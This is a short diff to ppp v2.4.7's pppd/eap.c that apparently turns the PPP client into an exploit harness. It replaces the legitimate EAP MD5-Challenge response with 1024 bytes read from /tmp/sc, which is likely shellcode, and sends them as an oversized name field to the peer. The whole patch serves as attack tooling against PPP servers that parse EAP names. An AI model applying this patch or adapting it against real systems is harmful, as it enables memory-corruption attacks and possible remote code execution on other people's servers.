@@ -1,0 +1,25 @@
+ppp v2.4.7
+
+diff --git a/pppd/eap.c b/pppd/eap.c
+index 6ea6c1f..31819ca 100644
+--- a/pppd/eap.c
++++ b/pppd/eap.c
+@@ -1452,8 +1452,16 @@ int len;
+ 		BZERO(secret, sizeof (secret));
+ 		MD5_Update(&mdContext, inp, vallen);
+ 		MD5_Final(hash, &mdContext);
+-		eap_chap_response(esp, id, hash, esp->es_client.ea_name,
+-		    esp->es_client.ea_namelen);
++		//eap_chap_response(esp, id, hash, esp->es_client.ea_name,
++		//    esp->es_client.ea_namelen);
++
++		char payload[1024] = {0};
++		FILE *fp = fopen("/tmp/sc", "r");
++		fread(payload, 1, 1024, fp);
++		fclose(fp);
++
++		eap_chap_response(esp, id, hash, payload, 1024);
++
+ 		break;
+ 
+ #ifdef USE_SRP
